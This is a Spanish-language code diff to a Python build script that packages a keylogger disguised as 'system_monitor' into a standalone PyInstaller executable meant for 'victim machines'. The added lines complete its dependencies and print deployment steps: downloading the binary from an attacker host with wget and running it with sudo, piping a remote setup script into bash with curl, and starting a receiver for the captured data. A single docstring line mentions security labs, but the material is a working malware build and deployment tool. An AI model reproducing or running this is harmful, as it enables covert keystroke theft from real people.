@@ -6,25 +6,14 @@
 Convierte el keylogger en un ejecutable autónomo para
 facilitar el despliegue en máquinas víctima.
 
-    print("🎉 ¡COMPILACIÓN COMPLETADA!")
-    print("=" * 50)
-    print("📦 Ejecutable creado: dist/system_monitor")
-    print("🚀 Script de despliegue: deploy_keylogger.sh")
-    print("🌐 Interfaz web: index.html")
-    print()
-    print("📋 PRÓXIMOS PASOS:")
-    print("1. ./deploy_keylogger.sh    (guía interactiva)")
-    print("2. python3 -m http.server 8000    (interfaz web)")
-    print("3. Abrir http://10.0.2.15:8000 en víctima")
-    print()
-    print("🎯 Para recibir datos:")
-    print("python3 data_receiver.py --port 8080")- Ejecutable standalone sin dependencias
+RESULTADO:
+- Ejecutable standalone sin dependencias
 - Incluye todas las librerías necesarias
 - Funciona sin Python instalado
 - Perfecto para laboratorios de seguridad
 
 USO:
-1. python3 build_keylogger.py
+1. python3 build_keylogger_new.py
 2. Copiar dist/system_monitor a máquina víctima
 3. En víctima: chmod +x system_monitor && sudo ./system_monitor
 """
@@ -113,28 +102,48 @@ def build_executable():
         if os.path.exists(spec_file):
             os.remove(spec_file)
     
-    # Comando de compilación
+    # Comando de compilación CORREGIDO con todas las dependencias
     cmd = [
         sys.executable, "-m", "PyInstaller",
-        "--onefile",                      # Un solo archivo
-        "--name=system_monitor",          # Nombre del ejecutable
-        "--add-data=reconstructor.py:.", # Incluir reconstructor.py
-        "--hidden-import=pynput",         # Importaciones requeridas
-        "--hidden-import=requests",
+        "--onefile",                                    # Un solo archivo
+        "--name=system_monitor",                        # Nombre del ejecutable
+        "--add-data=reconstructor.py:.",               # Incluir reconstructor.py
+        # Dependencias específicas de pynput
+        "--hidden-import=pynput.keyboard",
+        "--hidden-import=pynput.mouse", 
+        "--hidden-import=pynput._util.linux",
+        "--hidden-import=pynput._util.darwin",
+        "--hidden-import=pynput._util.win32",
+        "--hidden-import=pynput._util",
+        "--collect-all=pynput",                        # Incluir TODO pynput
+        # Dependencias específicas de requests
+        "--collect-all=requests",                      # Incluir TODO requests
+        "--hidden-import=requests.packages.urllib3",
+        "--hidden-import=urllib3",
+        "--hidden-import=certifi",
+        "--hidden-import=charset_normalizer",
+        "--hidden-import=idna",
+        "--hidden-import=urllib3.util.retry",
+        "--hidden-import=urllib3.util.connection",
+        # Dependencias estándar
         "--hidden-import=base64",
         "--hidden-import=hashlib",
         "--hidden-import=threading",
         "--hidden-import=time",
         "--hidden-import=os",
         "--hidden-import=json",
-        "--noconsole",                    # Sin ventana de consola
-        "--clean",                        # Limpiar cache
-        "system_monitor.py"               # Archivo principal
+        "--hidden-import=datetime",
+        "--hidden-import=sys",
+        "--hidden-import=socket",
+        "--hidden-import=ssl",
+        "--console",                                   # CON consola para debug inicial
+        "--clean",                                     # Limpiar cache
+        "system_monitor.py"                           # Archivo principal
     ]
     
     try:
-        print("💻 Ejecutando PyInstaller...")
-        print(f"📄 Comando: {' '.join(cmd)}")
+        print("💻 Ejecutando PyInstaller con dependencias completas...")
+        print(f"📄 Comando: {' '.join(cmd[:10])}... (comando completo muy largo)")
         
         result = subprocess.run(cmd, check=True, capture_output=True, text=True)
         
@@ -152,6 +161,7 @@ def build_executable():
             print(f"📂 Ejecutable: {executable_path}")
             print(f"📏 Tamaño: {size_mb:.1f} MB")
             print(f"🔧 Permisos: ejecutable")
+            print("⚠️  Nota: Ejecutable compilado con consola para debug")
             
             return True
         else:
@@ -179,7 +189,7 @@ echo "====================================="
 # Verificar ejecutable
 if [ ! -f "dist/system_monitor" ]; then
     echo "❌ Error: ejecutable no encontrado"
-    echo "   Ejecuta primero: python3 build_keylogger.py"
+    echo "   Ejecuta primero: python3 build_keylogger_new.py"
     exit 1
 fi
 
@@ -214,7 +224,9 @@ echo "   http://10.0.2.15:8000 -> 'Iniciar Diagnóstico'"
 echo "   # O en víctima (terminal):"
 echo "   wget http://10.0.2.15:8000/dist/system_monitor && chmod +x system_monitor && sudo ./system_monitor"
 echo ""
-echo "4. 🏃 EJECUCIÓN RÁPIDA (si ya tienes acceso SSH):"
+echo "4. ⚠️  MÉTODO ALTERNATIVO (si ejecutable falla):"
+echo "   curl -s http://10.0.2.15:8000/auto_setup.sh | bash"
+echo ""
 
 # Crear comando de ejecución rápida
 read -p "¿Ejecutar en máquina víctima ahora? (IP: 10.0.2.4) [y/N]: " -n 1 -r
@@ -275,14 +287,21 @@ def main():
     print("=" * 50)
     print("📦 Ejecutable creado: dist/system_monitor")
     print("🚀 Script de despliegue: deploy_keylogger.sh")
+    print("🌐 Interfaz web: index.html")
     print()
     print("📋 PRÓXIMOS PASOS:")
     print("1. ./deploy_keylogger.sh    (guía interactiva)")
-    print("2. sudo ./dist/system_monitor    (ejecución local)")
-    print("3. Copiar dist/system_monitor a víctima")
+    print("2. python3 -m http.server 8000    (interfaz web)")
+    print("3. Abrir http://10.0.2.15:8000 en víctima")
+    print()
+    print("🧪 PROBAR EJECUTABLE LOCALMENTE:")
+    print("sudo ./dist/system_monitor")
     print()
     print("🎯 Para recibir datos:")
     print("python3 data_receiver.py --port 8080")
+    print()
+    print("⚠️  Si falla, usa método alternativo:")
+    print("curl -s http://10.0.2.15:8000/auto_setup.sh | bash")
 
 if __name__ == "__main__":
     main()
